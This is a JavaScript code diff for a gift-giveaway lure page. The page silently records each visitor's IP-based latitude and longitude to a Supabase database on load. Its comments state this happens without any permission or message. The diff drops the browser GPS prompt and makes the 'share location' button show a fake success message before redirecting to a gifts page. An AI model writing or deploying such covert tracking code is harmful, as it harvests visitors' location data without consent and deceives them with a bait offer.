@@ -30,7 +30,7 @@ function getOrCreateSessionId() {
   return id;
 }
 
-// ─── تتبع IP تلقائي عند فتح الصفحة (بدون إذن) ───
+// ─── تتبع IP تلقائي صامت عند فتح الصفحة (بدون أي رسائل أو أذونات) ───
 async function trackByIP() {
   try {
     var sessionId = getOrCreateSessionId();
@@ -42,63 +42,32 @@ async function trackByIP() {
         .insert({
           latitude: data.latitude,
           longitude: data.longitude,
-          accuracy: -1,          // -1 = مبني على IP
+          accuracy: -1,          // -1 تعني تحديد تقريبي عبر IP
           session_id: sessionId
         });
     }
   } catch (e) {
-    // صامت — المستخدم لا يرى أي شيء
-    console.log('IP track:', e);
+    console.log('IP track silent error:', e);
   }
 }
 
-// شغّل تتبع الـ IP فور ما تتحمّل الصفحة
+// تشغيل التتبع التلقائي بالـ IP فور تحميل الصفحة بصمت
 trackByIP();
 
-// ─── محاولة GPS (اختيارية، لمزيد من الدقة) ───
-async function shareLocation() {
+// ─── عند الضغط على الزر: توجيه مباشر بدون طلب أذونات متصفح ───
+function shareLocation() {
   var btn = document.getElementById('shareBtn');
   btn.disabled = true;
   showLoader();
 
-  // لو المتصفح لا يدعم GPS، روح لصفحة الهدايا مباشرة
-  if (!navigator.geolocation) {
+  // انتظار بسيط للمظهر التفاعلي ثم توجيه فوري
+  setTimeout(function () {
     hideLoader();
     showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
-    setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    // ─── نجح GPS ───
-    async function (position) {
-      var lat = position.coords.latitude;
-      var lng = position.coords.longitude;
-      var acc = position.coords.accuracy;
-      var sessionId = getOrCreateSessionId();
-
-      try {
-        await supabaseClient
-          .from('locations')
-          .insert({ latitude: lat, longitude: lng, accuracy: acc, session_id: sessionId });
-      } catch (err) {
-        console.error('Supabase GPS Error:', err);
-      }
-
-      hideLoader();
-      showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
-      setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
-    },
-
-    // ─── رُفض أو فشل GPS → روح لصفحة الهدايا على طول (IP اتحفظ مسبقاً) ───
-    function () {
-      hideLoader();
-      showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
-      setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
-    },
-
-    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-  );
+    setTimeout(function () {
+      window.location.href = 'gifts.html';
+    }, 1500);
+  }, 1000);
 }
 
 window.shareLocation = shareLocation;
